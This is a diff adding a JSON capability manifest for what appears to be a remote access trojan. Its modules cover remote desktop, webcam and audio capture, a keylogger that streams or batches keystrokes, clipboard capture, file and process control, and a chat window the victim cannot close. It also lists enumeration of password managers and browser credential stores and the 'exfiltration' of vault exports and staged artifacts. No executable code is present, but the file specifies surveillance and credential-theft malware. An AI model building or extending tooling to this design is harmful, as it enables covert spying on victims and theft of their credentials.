@@ -1,0 +1,274 @@
+{
+  "modules": [
+    {
+      "id": "app-vnc",
+      "title": "Application VNC",
+      "description": "Launches curated applications inside a disposable workspace and streams them through VNC.",
+      "commands": ["app-vnc"],
+      "capabilities": [
+        {
+          "id": "app-vnc.launch",
+          "name": "app-vnc.launch",
+          "description": "Clone per-application profiles and start virtualized sessions."
+        }
+      ]
+    },
+    {
+      "id": "remote-desktop",
+      "title": "Remote Desktop",
+      "description": "Interactive remote desktop streaming and operator input relay.",
+      "commands": ["remote-desktop"],
+      "capabilities": [
+        {
+          "id": "remote-desktop.stream",
+          "name": "Desktop streaming",
+          "description": "Stream high-fidelity desktop frames to the controller UI."
+        },
+        {
+          "id": "remote-desktop.input",
+          "name": "Input relay",
+          "description": "Relay keyboard and pointer events back to the remote host."
+        },
+        {
+          "id": "remote-desktop.transport.quic",
+          "name": "QUIC transport",
+          "description": "Provide QUIC transport negotiation for resilient input streams."
+        },
+        {
+          "id": "remote-desktop.codec.hevc",
+          "name": "HEVC encoding",
+          "description": "Enable hardware-accelerated HEVC streaming when supported."
+        },
+        {
+          "id": "remote-desktop.metrics",
+          "name": "Performance telemetry",
+          "description": "Collect frame quality and adaptive bitrate metrics for dashboards."
+        }
+      ],
+      "telemetry": [
+        {
+          "id": "remote-desktop.metrics",
+          "name": "Performance telemetry",
+          "description": "Emit adaptive streaming metrics describing encoder performance and transport health."
+        }
+      ]
+    },
+    {
+      "id": "webcam-control",
+      "title": "Webcam Control",
+      "description": "Enumerate and control remote webcam devices.",
+      "commands": ["webcam-control"],
+      "capabilities": [
+        {
+          "id": "webcam.enumerate",
+          "name": "webcam.enumerate",
+          "description": "Enumerate connected webcam devices and capabilities."
+        },
+        {
+          "id": "webcam.stream",
+          "name": "webcam.stream",
+          "description": "Initiate webcam streaming sessions when supported."
+        }
+      ]
+    },
+    {
+      "id": "audio-control",
+      "title": "Audio Control",
+      "description": "Capture and inject audio for synchronized operator coordination.",
+      "commands": ["audio-control"],
+      "capabilities": [
+        {
+          "id": "audio.capture",
+          "name": "Audio capture",
+          "description": "Capture remote system audio for monitoring and recording."
+        },
+        {
+          "id": "audio.inject",
+          "name": "Audio injection",
+          "description": "Inject operator-provided audio streams into the remote session."
+        }
+      ],
+      "telemetry": [
+        {
+          "id": "audio.telemetry",
+          "name": "Audio telemetry",
+          "description": "Report capture bridge levels, buffer health, and device availability to the controller."
+        }
+      ]
+    },
+    {
+      "id": "keylogger",
+      "title": "Keylogger",
+      "description": "Capture keystrokes and related telemetry from the remote host.",
+      "commands": ["keylogger.start", "keylogger.stop"],
+      "capabilities": [
+        {
+          "id": "keylogger.stream",
+          "name": "keylogger.stream",
+          "description": "Stream keystroke telemetry to the controller in near real time."
+        },
+        {
+          "id": "keylogger.batch",
+          "name": "keylogger.batch",
+          "description": "Batch keystrokes offline and upload on a schedule."
+        }
+      ]
+    },
+    {
+      "id": "clipboard",
+      "title": "Clipboard Manager",
+      "description": "Synchronize clipboard contents between the operator and remote workstation.",
+      "commands": ["clipboard"],
+      "capabilities": [
+        {
+          "id": "clipboard.capture",
+          "name": "Clipboard capture",
+          "description": "Capture clipboard changes emitted by the remote workstation."
+        },
+        {
+          "id": "clipboard.push",
+          "name": "Clipboard push",
+          "description": "Push operator clipboard payloads to the remote host."
+        }
+      ]
+    },
+    {
+      "id": "file-manager",
+      "title": "File Manager",
+      "description": "Inspect and manage the remote file system.",
+      "commands": ["file-manager"],
+      "capabilities": [
+        {
+          "id": "file-manager.explore",
+          "name": "file-manager.explore",
+          "description": "Enumerate directories and retrieve file contents from the host."
+        },
+        {
+          "id": "file-manager.modify",
+          "name": "file-manager.modify",
+          "description": "Create, update, move, and delete files and directories on demand."
+        }
+      ]
+    },
+    {
+      "id": "task-manager",
+      "title": "Task Manager",
+      "description": "Enumerate and control processes on the remote host.",
+      "commands": ["task-manager"],
+      "capabilities": [
+        {
+          "id": "task-manager.list",
+          "name": "task-manager.list",
+          "description": "Collect real-time process snapshots with metadata."
+        },
+        {
+          "id": "task-manager.control",
+          "name": "task-manager.control",
+          "description": "Start and orchestrate process actions on demand."
+        }
+      ]
+    },
+    {
+      "id": "tcp-connections",
+      "title": "TCP Connections",
+      "description": "Enumerate and govern active TCP sockets exposed by the host.",
+      "commands": ["tcp-connections"],
+      "capabilities": [
+        {
+          "id": "tcp-connections.enumerate",
+          "name": "tcp-connections.enumerate",
+          "description": "Collect real-time socket state with process attribution."
+        },
+        {
+          "id": "tcp-connections.control",
+          "name": "tcp-connections.control",
+          "description": "Stage enforcement actions for suspicious remote peers."
+        }
+      ]
+    },
+    {
+      "id": "recovery",
+      "title": "Recovery Operations",
+      "description": "Stage, track, and collect recovery payloads across modules.",
+      "commands": ["recovery"],
+      "capabilities": [
+        {
+          "id": "recovery.queue",
+          "name": "Recovery queue",
+          "description": "Queue recovery jobs for background execution and monitoring."
+        },
+        {
+          "id": "recovery.collect",
+          "name": "Artifact collection",
+          "description": "Collect artifacts staged by upstream modules for exfiltration."
+        },
+        {
+          "id": "vault.export",
+          "name": "Vault export collection",
+          "description": "Stage and exfiltrate vault exports via the recovery pipeline."
+        }
+      ]
+    },
+    {
+      "id": "client-chat",
+      "title": "Client Chat",
+      "description": "Persistent two-way chat channel that the client cannot dismiss locally.",
+      "commands": ["client-chat"],
+      "capabilities": [
+        {
+          "id": "client-chat.persistent",
+          "name": "Persistent window",
+          "description": "Keep the chat interface open continuously and respawn it if terminated."
+        },
+        {
+          "id": "client-chat.alias",
+          "name": "Alias control",
+          "description": "Allow the controller to update operator and client aliases in real time."
+        }
+      ]
+    },
+    {
+      "id": "system-info",
+      "title": "System Information",
+      "description": "Collect host metadata, hardware configuration, and telemetry snapshots.",
+      "commands": ["system-info"],
+      "capabilities": [
+        {
+          "id": "system-info.snapshot",
+          "name": "System snapshot",
+          "description": "Produce structured operating system and hardware inventories."
+        },
+        {
+          "id": "system-info.telemetry",
+          "name": "System telemetry",
+          "description": "Surface live telemetry metrics used by scheduling and recovery modules."
+        },
+        {
+          "id": "vault.enumerate",
+          "name": "Vault enumeration",
+          "description": "Enumerate installed password managers and browser credential stores."
+        }
+      ],
+      "telemetry": [
+        {
+          "id": "system-info.telemetry",
+          "name": "System telemetry",
+          "description": "Stream host performance counters, thermal states, and resource utilization snapshots."
+        }
+      ]
+    },
+    {
+      "id": "notes",
+      "title": "Incident Notes",
+      "description": "Secure local note taking synchronized with the controller vault.",
+      "commands": ["notes.sync"],
+      "capabilities": [
+        {
+          "id": "notes.sync",
+          "name": "Notes sync",
+          "description": "Synchronize local incident notes to the operator vault with delta compression."
+        }
+      ]
+    }
+  ]
+}
